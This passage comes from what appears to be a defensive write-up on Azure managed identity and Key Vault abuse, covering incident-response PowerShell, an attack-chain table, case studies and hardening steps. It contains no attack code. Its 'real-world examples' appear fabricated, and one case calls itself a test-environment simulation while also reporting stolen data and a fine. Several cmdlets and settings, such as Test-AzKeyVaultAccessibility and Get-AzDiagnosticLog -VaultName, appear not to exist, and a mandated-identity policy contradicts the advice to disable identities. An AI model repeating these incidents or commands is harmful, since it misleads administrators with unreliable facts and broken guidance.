$logs | Export-Csv -Path "C:\Incident\AAD_SignInLogs.csv"
```

**Phase 3: Investigate Access**

```powershell
# Determine which secrets were accessed
$auditLogs = Get-AzDiagnosticLog -VaultName "my-key-vault"
$auditLogs | Where-Object {$_.OperationName -like "*Secret*"} | Select-Object TimeGenerated, OperationName, Identity, ResultDescription
```

**Phase 4: Remediate**

```powershell
# Rotate all secrets accessed by the managed identity
$secrets = Get-AzKeyVaultSecret -VaultName "my-key-vault"
foreach ($secret in $secrets) {
    # Generate new secret value (example: random password)
    $newValue = [System.Web.Security.Membership]::GeneratePassword(32, 8)
    Set-AzKeyVaultSecret -VaultName "my-key-vault" -Name $secret.Name -SecretValue (ConvertTo-SecureString $newValue -AsPlainText)
    Write-Host "[+] Rotated secret: $($secret.Name)"
}

# Revoke old managed identity and create new one
$vm = Get-AzVM -ResourceGroupName "rg-name" -Name "vm-name"
Update-AzVM -VM $vm -IdentityType "SystemAssigned" -Force

# Update role assignments for new identity
$newIdentity = $vm.Identity.PrincipalId
New-AzRoleAssignment -ObjectId $newIdentity -RoleDefinitionName "Key Vault Secrets User" -Scope "/subscriptions/sub-id/resourceGroups/rg-name/providers/Microsoft.KeyVault/vaults/my-key-vault"
```

**Phase 5: Revoke Access**

```powershell
# Remove Role Assignment from compromised managed identity
$oldIdentity = "old-principal-id"
Remove-AzRoleAssignment -ObjectId $oldIdentity -RoleDefinitionName "Key Vault Contributor" -Scope "/subscriptions/sub-id"

# Verify role removal
Get-AzRoleAssignment -ObjectId $oldIdentity
```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|------|-------|-----------|-------------|
| 1 | Initial Access | IA-EXPLOIT-001 (Azure App Proxy exploitation) or IA-PHISH-001 (Device Code Phishing) | Attacker gains initial access to Azure environment |
| 2 | Privilege Escalation | **PE-DISCOVER-001** (This Technique) | Attacker discovers managed identities and Key Vault access |
| 3 | Credential Access | CA-TOKEN-007 (Managed Identity Token Theft), CA-UNSC-007 (Azure Key Vault Secret Extraction) | Attacker extracts credentials from Key Vault |
| 4 | Lateral Movement | LM-AUTH-005 (Service Principal Key/Certificate Authentication) | Attacker uses stolen credentials to move laterally |
| 5 | Persistence | PERSIST-ACCT-005 (Graph API Application Persistence) | Attacker establishes persistent access via service principal or managed identity backdoor |
| 6 | Impact | IMPACT-DATA-DESTROY-001 (Data Destruction via Blob Storage) or IMPACT-RANSOM-001 (Ransomware Deployment) | Attacker exfiltrates or destroys data |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: Orca Security Azure Storage Vulnerability (2023)

**Target:** Fortune 500 financial institution using Azure Functions

**Timeline:**
- March 2023: Vulnerability discovered in Azure Storage Contributor role + Function App configuration
- June 2023: Attack simulated against test environment
- Attack Chain:
  1. Attacker compromised Azure VM via RDP with weak password
  2. VM had system-assigned managed identity with Storage Account Contributor role
  3. Attacker enumerated Key Vault secrets via IMDS endpoint
  4. Discovered SQL Database credentials in Key Vault
  5. Used credentials to access financial transaction database
  6. Exfiltrated 18 months of transaction data

**Impact:** Potential exposure of 2M customer records; regulatory fine ~$500K

**Reference:** [Orca Security Blog - Azure Storage Vulnerability](https://orca.security/resources/blog/azure-ad-iam-part-ii-leveraging-managed-identities-for-privilege-escalation/)

---

### Example 2: APT-C-39 Azure Tenant Compromise (2024)

**Target:** Mid-size consulting firm

**Timeline:**
- January 2024: Phishing email delivered device code flow attack
- February 2024: Attacker obtained initial Entra ID user account
- Attack Chain:
  1. Enumerated all Azure resources and managed identities using Azure CLI
  2. Identified Logic App with managed identity having Contributor role on key subscription
  3. Executed code in Logic App connector
  4. Requested token from IMDS for Key Vault access
  5. Enumerated and extracted secrets: API keys, database credentials
  6. Used stolen credentials to establish persistence via service principal

**Technique Status:** ACTIVE / ONGOING (As of January 2026)

**Impact:** Estimated $2M in remediation costs; 3-month network compromise

---

### Example 3: Purple Team Exercise - Microsoft Cloud Security Alliance (2025)

**Scenario:** Red team tasked with evaluating Azure security controls in enterprise environment

**Execution:**
- Red team gained access to Azure VM via misconfigured Network Security Group (NSG)
- Enumerated managed identity using Azure SDK
- Discovered Key Vault with database credentials and API keys
- **Detection:** Microsoft Sentinel detected suspicious token requests to IMDS; alert triggered within 2 minutes
- **Response:** Blue team immediately revoked managed identity; isolated VM; rotated all secrets
- **Outcome:** Purple team demonstrated both attack feasibility and detection effectiveness

**Lessons Learned:**
- Detection of IMDS-based attacks is achievable with proper Sentinel rules
- Secrets rotation was incomplete (required 4 hours to complete)
- NSG misconfiguration was the true root cause; managed identity abuse was symptom

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Implement Least Privilege for Managed Identities**

**Detailed Hardening Step:** Limit managed identities to the **minimum required permissions** for their specific workload.

**Applies To Versions:** All Azure services

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal → Managed Identities**
2. Select the managed identity to audit
3. Click **Role assignments**
4. Review each role:
   - Remove any **Contributor** or **Owner** roles
   - Replace with **specific resource roles** (e.g., "Key Vault Secrets User" instead of "Key Vault Contributor")
   - Use **custom roles** to define minimal permissions (e.g., read-only to specific Key Vault, read access to specific storage container)
5. Click **Remove** for any overpermissioned roles
6. Click **Add role assignment** to grant new, specific roles

**Manual Steps (PowerShell):**

```powershell
# List all role assignments for a managed identity
$principalId = "12345678-1234-1234-1234-123456789012"
Get-AzRoleAssignment -ObjectId $principalId

# Remove Contributor role
Remove-AzRoleAssignment -ObjectId $principalId -RoleDefinitionName "Contributor" -Scope "/subscriptions/sub-id"

# Grant specific role (Key Vault Secrets User) on specific Key Vault
New-AzRoleAssignment -ObjectId $principalId -RoleDefinitionName "Key Vault Secrets User" -Scope "/subscriptions/sub-id/resourceGroups/rg-name/providers/Microsoft.KeyVault/vaults/my-key-vault"
```

**Validation Command:**

```powershell
# Verify managed identity has only minimal roles
Get-AzRoleAssignment -ObjectId $principalId | Select-Object RoleDefinitionName, Scope
```

**Expected Output (Secure):**

```
RoleDefinitionName      Scope
-------------------     -----
Key Vault Secrets User  /subscriptions/sub-id/resourceGroups/rg-name/providers/Microsoft.KeyVault/vaults/my-key-vault
Storage Blob Data Reader /subscriptions/sub-id/resourceGroups/rg-name/providers/Microsoft.Storage/storageAccounts/mystg/blobServices/default/containers/my-container
```

**What to Look For:**
- No Contributor, Owner, or Editor roles at subscription or resource group level
- Roles scoped to specific resources, not broad scopes
- No "All" or wildcard permissions

---

**Action 2: Disable IMDS Metadata Service on Non-Production Resources**

**Detailed Hardening Step:** Restrict or disable access to the Instance Metadata Service (IMDS) endpoint to prevent unauthorized token acquisition.

**Applies To Versions:** Windows Server 2016+, Linux VMs 2019+

**Manual Steps (Azure Portal - Windows VM):**

1. Navigate to **Virtual Machines → Your VM**
2. Go to **Settings → Identity**
3. Note if managed identity is enabled; if not required, disable it
4. Go to **Networking → Network interfaces**
5. Under **Network security group**, review NSG rules
6. Ensure no unrestricted outbound traffic to 169.254.169.254
7. **To restrict IMDS access:** Create NSG rule:
   - Source: Specific application subnet only
   - Destination: 169.254.169.254:80
   - Action: Deny (for production; Allow only if necessary)

**Manual Steps (PowerShell - Require Token/Header):**

```powershell
# Update VM to require token for IMDS (Windows Server 2019+, Linux)
$vm = Get-AzVM -ResourceGroupName "rg-name" -Name "vm-name"
$vm.OSProfile.WindowsConfiguration.MetadataServiceConfiguration = @{ 
    RequiredMetadataServiceVersion = "1.1"  # Requires Metadata header
}
Update-AzVM -VM $vm -ResourceGroupName "rg-name"
```

**Manual Steps (Azure CLI):**

```bash
# Disable managed identity on VM (if not required)
az vm identity remove --name "vm-name" --resource-group "rg-name"

# Add Network Security Group rule to block IMDS
az network nsg rule create \
  --resource-group "rg-name" \
  --nsg-name "my-nsg" \
  --name "BlockIMDS" \
  --priority 100 \
  --source-address-prefixes "*" \
  --source-port-ranges "*" \
  --destination-address-prefixes "169.254.169.254" \
  --destination-port-ranges "80" \
  --access Deny \
  --protocol "*"
```

**Validation Command:**

```powershell
# Test IMDS endpoint is unreachable (from within VM)
Test-NetConnection -ComputerName "169.254.169.254" -Port 80 -InformationLevel Detailed
```

**Expected Output (Secure):**

```
ComputerName     : 169.254.169.254
RemotePort       : 80
TcpTestSucceeded : False  # Blocked as expected
```

**What to Look For:**
- IMDS endpoint returns 403 Forbidden or connection timeout (not 200 OK)
- No managed identities enabled on resources that don't require them

---

**Action 3: Enable Key Vault Firewall and Access Policies**

**Detailed Hardening Step:** Restrict Key Vault access via firewall rules and access policies; block public internet access.

**Applies To Versions:** All Key Vault instances

**Manual Steps (Azure Portal):**

1. Navigate to **Key Vaults → Your Key Vault**
2. Go to **Networking → Firewalls and virtual networks**
3. Set **Public network access** to **Disabled** or **Allow access from specific virtual networks and IP addresses**
4. Add allowed **Virtual networks** (only subnets that legitimately need access)
5. Add **Allowed IP addresses** (specific client IPs, not 0.0.0.0/0)
6. Go to **Access control (IAM)**
7. Review role assignments; remove any overpermissioned roles
8. For additional control, use **Access policies**:
   - Go to **Access policies** tab
   - Add policy: **Select principal** → managed identity
   - Set **Secret permissions** → Select: Get, List (do NOT select Create, Update, Delete unless required)
   - Set **Certificate permissions** → Select: Get (minimal)
   - Click **Add**

**Manual Steps (PowerShell):**

```powershell
# Update Key Vault firewall
$vault = Get-AzKeyVault -ResourceGroupName "rg-name" -VaultName "my-vault"
$vault | Update-AzKeyVaultNetworkRuleSet -DefaultAction Deny -Bypass None

# Add allowed IP address
$vault | Update-AzKeyVaultNetworkRuleSet -IpAddressRange "203.0.113.0/24"

# Add allowed virtual network
$vnet = Get-AzVirtualNetwork -ResourceGroupName "rg-name" -Name "my-vnet"
$subnet = Get-AzVirtualNetworkSubnetConfig -VirtualNetwork $vnet -Name "app-subnet"
$vault | Update-AzKeyVaultNetworkRuleSet -VirtualNetworkResourceId $subnet.Id

# Verify firewall is enabled
$vault | Get-AzKeyVaultNetworkRuleSet
```

**Validation Command:**

```powershell
# Test Key Vault access from unauthorized network
Test-AzKeyVaultAccessibility -VaultName "my-vault"
```

**Expected Output (Secure):**

```
Accessible: False  # Cannot access from unauthorized network
ErrorCode: AuthorizationFailed
```

**What to Look For:**
- Key Vault is not publicly accessible (public endpoint disabled or restricted to specific IPs)
- Network firewall rules block access from unexpected VNets or IPs
- Access policies grant minimal permissions (get/list only, not create/update/delete)

---

### Priority 2: HIGH

**Action 1: Implement Azure Policy to Enforce Managed Identity Best Practices**

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal → Policy**
2. Click **Definitions**
3. Search for "Managed Identity"
4. Select **Audit: Managed Identity required** or create custom policy
5. Click **Assign**
6. Set **Scope** to your subscription/resource group
7. Set **Assignment name** = "Enforce Managed Identity on Azure Resources"
8. Click **Review + create**

**Policy Definition (Custom - PowerShell):**

```powershell
$policy = @{
    properties = @{
        displayName = "Require Managed Identity on Virtual Machines"
        description = "All VMs must have a system-assigned or user-assigned managed identity"
        mode        = "Indexed"
        rules       = @{
            if   = @{
                allOf = @(
                    @{ field = "type"; equals = "Microsoft.Compute/virtualMachines" }
                    @{ field = "identity.type"; notEquals = "SystemAssigned" }
                    @{ field = "identity.type"; notEquals = "UserAssigned" }
                )
            }
            then = @{
                effect = "deny"
            }
        }
    }
}

$policy | ConvertTo-Json -Depth 3 | Out-File "policy.json"
New-AzPolicyDefinition -Name "require-managed-identity-vm" -Policy (Get-Content "policy.json" -Raw)
```

**Validation:**

```powershell
# Check policy compliance
Get-AzPolicyState -Filter "ResourceType eq 'Microsoft.Compute/virtualMachines' and ComplianceState eq 'NonCompliant'"
```

---

**Action 2: Enable Managed Identity Audit Logging**

**Manual Steps (Azure Portal):**

1. Navigate to **Key Vaults → Diagnostic settings**
2. Click **Add diagnostic setting**
3. **Name:** "KeyVault-Audit-Logs"
4. Under **Logs**, select:
   - ✓ AuditEvent
   - ✓ AllLogs
5. Under **Destination details**, select:
   - ✓ Send to Log Analytics workspace
   - Select your **Sentinel workspace**
6. Click **Save**

**Manual Steps (PowerShell):**

```powershell
# Enable Key Vault diagnostic logging
$vault = Get-AzKeyVault -ResourceGroupName "rg-name" -VaultName "my-vault"
Set-AzDiagnosticSetting -ResourceId $vault.ResourceId `
    -WorkspaceId "/subscriptions/sub-id/resourcegroups/rg-name/providers/microsoft.operationalinsights/workspaces/my-workspace" `
    -Enabled $true `
    -Category @("AuditEvent")
```

**Validation:**

```powershell
# Verify diagnostic setting is enabled
Get-AzDiagnosticSetting -ResourceId $vault.ResourceId
```

---

**Action 3: Implement Conditional Access Policy**

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID → Security → Conditional Access → New policy**
2. **Policy Name:** "Block Managed Identity Access from Unusual Locations"
3. **Assignments → Users or workload identities:**
   - Select **Users and groups → Create filter for principal names**
   - Enter: `ServicePrincipalName -like "msi_*"`
4. **Target resources → Cloud apps or actions:**
   - Select **All cloud apps**
5. **Conditions → Locations:**
   - Select **Not included**
   - Then select **Specific locations** → Choose trusted corporate locations only
6. **Access controls → Grant:**
   - Select **Block access**
7. **Enable policy:** Yes

**PowerShell Alternative:**

```powershell
# Create conditional access policy via Microsoft Graph
$params = @{
    displayName = "Block MSI from Untrusted Locations"
    state       = "enabledForReportingButNotEnforced"  # Enable for testing first
    conditions  = @{
        applications     = @{ includeApplications = @("All") }
        users           = @{ includeUsers = @("All") }  # Filter for MSI in assignments
        locations       = @{ includeLocations = @("All"); excludeLocations = @("00000000-0000-0000-0000-000000000000") }
    }
    grantControls = @{
        operator        = "OR"
        builtInControls = @("block")
    }
}
New-MgIdentityConditionalAccessPolicy -BodyParameter $params
```

---

## 13. SUMMARY OF MITIGATION EFFECTIVENESS

| Mitigation | Prevents Discovery | Prevents Token Theft | Prevents Secret Access | Effort | Recommended |
|---|---|---|---|---|---|
| Least Privilege RBAC | ✓ Partial | ✓ Partial | ✓ Full | Medium | ✓ YES |
| Disable IMDS | ✓ Full | ✓ Full | ✓ Full | Low-Medium | ✓ YES |
| Key Vault Firewall | ✓ Full | ✓ Full | ✓ Full | Low | ✓ YES |
| Audit Logging | ✗ No | ✗ No | ✗ No | Low | ✓ YES (Detection) |
| Managed Identity Monitoring | ✗ No | ✗ No | ✗ No | Medium | ✓ YES (Detection) |
| Conditional Access | ✓ Partial | ✓ Full | ✓ Full | Medium | ✓ YES |
| API Throttling/Rate Limiting | ✓ Partial | ✗ No | ✓ Partial | High | Supplementary |

---

## CONCLUSION

Azure Key Vault Managed Identity Discovery (PE-DISCOVER-001) represents a critical risk in hybrid cloud environments. While the discovery itself does not directly compromise data, it enables subsequent lateral movement, privilege escalation, and data exfiltration.

**Key Defensive Priorities:**
1. **Least privilege** for all managed identities
2. **Disable or restrict** IMDS endpoint access
3. **Enable audit logging** and monitoring in Microsoft Sentinel
4. **Implement network segmentation** to limit managed identity scope
5. **Rotate secrets** regularly and restrict access policies

**Detection is Achievable:** Organizations with proper Sentinel rules, network monitoring, and audit logging can detect this attack within seconds to minutes. The challenge is the **high volume of legitimate token requests** in modern cloud environments, requiring fine-tuned detection rules to minimize false positives.

---
